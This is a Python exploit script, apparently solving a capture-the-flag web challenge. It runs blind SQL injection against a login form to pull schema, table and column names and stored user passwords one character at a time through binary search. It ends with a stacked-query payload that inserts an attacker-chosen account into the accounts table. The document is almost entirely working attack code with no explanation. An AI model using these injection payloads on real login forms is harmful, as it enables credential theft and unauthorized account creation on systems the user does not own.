import requests
import time

url = "https://pasteweb.ctf.zoolab.org/"

def binary_search_database(offset, i):
    low = 0
    upper = 128
    while low <= upper:
        current_time = round(time.time())
        mid = (low + upper) // 2  
        post = {'username':"user' or ASCII(SUBSTR((SELECT schema_name FROM information_schema.schemata limit 1 offset "+str(offset)+"), "+str(i)+", 1)) = "+str(mid)+" --", 'password':'123', 'current_time':current_time}
        ret = requests.post(url, post).text
        if 'Bad Hacker!' in ret:
            return mid
        else:
            post = {'username':"user' or ASCII(SUBSTR((SELECT schema_name FROM information_schema.schemata limit 1 offset "+str(offset)+"), "+str(i)+", 1)) > "+str(mid)+" --", 'password':'123', 'current_time':current_time}
            ret = requests.post(url, post).text
            if 'Bad Hacker!' in ret:
                low = mid + 1
            elif 'Login Failed' in ret:
                upper = mid - 1

def binary_search_tables(offset, i):
    low = 0
    upper = 128
    while low <= upper:
        current_time = round(time.time())
        mid = (low + upper) // 2  
        post = {'username':"user' or ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE TABLE_SCHEMA = 'public' limit 1 offset "+str(offset)+"), "+str(i)+", 1)) = "+str(mid)+" --", 'password':'123', 'current_time':current_time}
        ret = requests.post(url, post).text
        if 'Bad Hacker!' in ret:
            return mid
        else:
            post = {'username':"user' or ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE TABLE_SCHEMA = 'public' limit 1 offset "+str(offset)+"), "+str(i)+", 1)) > "+str(mid)+" --", 'password':'123', 'current_time':current_time}
            ret = requests.post(url, post).text
            if 'Bad Hacker!' in ret:
                low = mid + 1
            elif 'Login Failed' in ret:
                upper = mid - 1

def binary_search_column(offset, i):
    low = 0
    upper = 128
    while low <= upper:
        current_time = round(time.time())
        mid = (low + upper) // 2  
        post = {'username':"user' or ASCII(SUBSTR((SELECT COLUMN_DEFAULT FROM information_schema.columns WHERE table_name = 'pasteweb_accounts' limit 1 offset "+str(offset)+"), "+str(i)+", 1)) = "+str(mid)+" --", 'password':'123', 'current_time':current_time}
        ret = requests.post(url, post).text
        if 'Bad Hacker!' in ret:
            return mid
        else:
            post = {'username':"user' or ASCII(SUBSTR((SELECT COLUMN_DEFAULT FROM information_schema.columns WHERE table_name = 'pasteweb_accounts' limit 1 offset "+str(offset)+"), "+str(i)+", 1)) > "+str(mid)+" --", 'password':'123', 'current_time':current_time}
            ret = requests.post(url, post).text
            if 'Bad Hacker!' in ret:
                low = mid + 1
            elif 'Login Failed' in ret:
                upper = mid - 1

def binary_search_data(offset, i):
    low = 0
    upper = 128
    while low <= upper:
        current_time = round(time.time())
        mid = (low + upper) // 2  
        post = {'username':"user' or ASCII(SUBSTR((SELECT user_password FROM pasteweb_accounts limit 1 offset "+str(offset)+"), "+str(i)+", 1)) = "+str(mid)+" --", 'password':'123', 'current_time':current_time}
        ret = requests.post(url, post).text
        if 'Bad Hacker!' in ret:
            return mid
        else:
            post = {'username':"user' or ASCII(SUBSTR((SELECT user_password FROM pasteweb_accounts limit 1 offset "+str(offset)+"), "+str(i)+", 1)) > "+str(mid)+" --", 'password':'123', 'current_time':current_time}
            ret = requests.post(url, post).text
            if 'Bad Hacker!' in ret:
                low = mid + 1
            elif 'Login Failed' in ret:
                upper = mid - 1

def test_length_database(offset):
    count = 1
    while True:
        current_time = round(time.time())
        post = {'username':"user' or ASCII(SUBSTR((SELECT schema_name FROM information_schema.schemata limit 1 offset "+str(offset)+"), "+str(count)+", 1)) > 0 --", 'password':'123', 'current_time':current_time}
        ret = requests.post(url, post).text
        if 'Login Failed' in ret:
            return count
        count += 1

def test_length_tables(offset):
    count = 1
    while True:
        current_time = round(time.time())
        post = {'username':"user' or ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE TABLE_SCHEMA = 'public' limit 1 offset "+str(offset)+"), "+str(count)+", 1)) > 0 --", 'password':'123', 'current_time':current_time}
        ret = requests.post(url, post).text
        if 'Login Failed' in ret:
            return count
        count += 1

def test_length_column(offset):
    count = 1
    while True:
        current_time = round(time.time())
        post = {'username':"user' or ASCII(SUBSTR((SELECT COLUMN_DEFAULT FROM information_schema.columns WHERE table_name = 'pasteweb_accounts' limit 1 offset "+str(offset)+"), "+str(count)+", 1)) > 0 --", 'password':'123', 'current_time':current_time}
        ret = requests.post(url, post).text
        if 'Login Failed' in ret:
            return count
        count += 1

def test_length_data(offset):
    count = 1
    while True:
        current_time = round(time.time())
        post = {'username':"user' or ASCII(SUBSTR((SELECT user_password FROM pasteweb_accounts limit 1 offset "+str(offset)+"), "+str(count)+", 1)) > 0 --", 'password':'123', 'current_time':current_time}
        ret = requests.post(url, post).text
        if 'Login Failed' in ret:
            return count
        count += 1

# for offset in range(3):
#     length = test_length_database(offset)
#     for i in range(1, length):
#         ret = binary_search_database(offset, i)
#         print(chr(ret), end='')
#     print()
#     print('------')

# for offset in range(10):
#     length = test_length_tables(offset)
#     print(length)
#     for i in range(1, length):
#         ret = binary_search_tables(offset, i)
#         print(chr(ret), end='')
#     print()
#     print('------')

for offset in range(3):
    length = test_length_column(offset)
    print(length)
    for i in range(1, length):
        ret = binary_search_column(offset, i)
        print(chr(ret), end='')
    print()
    print('------')

# for offset in range(3):
#     length = test_length_data(offset)
#     print(length)
#     for i in range(1, length):
#         ret = binary_search_data(offset, i)
#         print(chr(ret), end='')
#     print()
#     print('------')

# post = {'username':"user' or ASCII(SUBSTR((SELECT schema_name FROM information_schema.schemata limit 1 offset 0), 7, 1)) > 0 --", 'password':'123', 'current_time':time}
# ret = requests.post(url, post).text
# if 'Login Failed' in ret:
#     print('false')
# elif 'Bad Hacker!' in ret:
#     print('true')
admin' or 1=1; INSERT into pasteweb_accounts(user_id, user_account, user_password) values (nextval('pasteweb_accounts_user_id_seq'::regclass), 'eric070021', MD5('milicary')); --
